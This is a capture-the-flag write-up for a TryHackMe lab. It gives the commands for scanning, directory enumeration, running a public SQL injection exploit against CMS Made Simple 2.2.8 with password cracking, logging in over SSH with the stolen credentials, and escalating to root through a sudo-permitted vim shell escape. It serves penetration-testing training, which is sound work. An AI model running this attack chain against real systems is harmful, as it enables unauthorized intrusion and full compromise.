---

# Simple CTF Writeup

## Room Information

**Platform:** TryHackMe
**Room:** Simple CTF
**Difficulty:** Easy

---

## Objective

The objective of this room is to perform enumeration, exploit a vulnerable web application, obtain credentials, gain SSH access, and escalate privileges to root.

---

# Reconnaissance / Enumeration

The first step was to scan the target machine to identify open ports and running services.

```bash
nmap -sC -sV -vv MACHINE_IP
```

The scan revealed the following open ports:

* **21 (FTP)** → Anonymous login allowed
* **80 (HTTP)** → Web server running Apache
* **2222 (SSH)** → Remote login service

Since a web service was available, the next step was to analyze the website.

---

# Web Inspection

After opening the website in the browser, the default Apache page was displayed.

To find hidden content, further enumeration was required.

---

# Directory Discovery

To discover hidden directories and files, I used Gobuster:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
```

The scan revealed an important directory:

```
/simple
```

---

# Application Analysis

Navigating to:

```
http://MACHINE_IP/simple
```

revealed that the application was:

```
CMS Made Simple 2.2.8
```

This version is known to be vulnerable.

---

# Vulnerability Analysis

I searched for known exploits related to this version:

```bash
searchsploit cms made simple 2.2.8
```

This revealed:

```
CVE-2019-9053
```

---

# Exploitation (SQL Injection)

The vulnerability is:

```
SQL Injection (SQLi)
```

I downloaded the exploit:

```bash
searchsploit -m php/webapps/46635.py
```

Then executed it:

```bash
python3 46635.py -u http://MACHINE_IP/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
```

---

# Credentials Obtained

The exploit successfully retrieved valid credentials:

```
Username: mitch
Password: secret
```

---

# Initial Access (SSH)

Using the obtained credentials, I logged into the system via SSH:

```bash
ssh mitch@MACHINE_IP -p 2222
```

Login was successful, providing shell access.

---

# Privilege Escalation

To check for privilege escalation opportunities, I ran:

```bash
sudo -l
```

The output showed:

```
(ALL) NOPASSWD: /usr/bin/vim
```

This indicates that the user can run **vim as root without a password**.

---

# Root Access

Vim can be used to spawn a root shell.

```bash
sudo vim
```

Inside vim:

```bash
:!bash
```

This resulted in a **root shell**, giving full control over the system.

---

# Flag / Final Access

After gaining root access, I navigated the system and retrieved the required flags using commands such as:

```bash
ls
cat <filename>
```

---

# Tools Used

* Nmap
* Gobuster
* Searchsploit
* Python Exploit Script
* SSH
* Linux Commands

---

# Lessons Learned

This room demonstrates a complete attack chain from initial enumeration to root access.

Key techniques practiced:

* Network scanning with **Nmap**
* Directory discovery using **Gobuster**
* Identifying vulnerable web applications
* Exploiting **SQL Injection**
* Password cracking with wordlists
* Gaining access via SSH
* Privilege escalation using **misconfigured sudo permissions**

This challenge highlights how a combination of small vulnerabilities can lead to full system compromise.

---

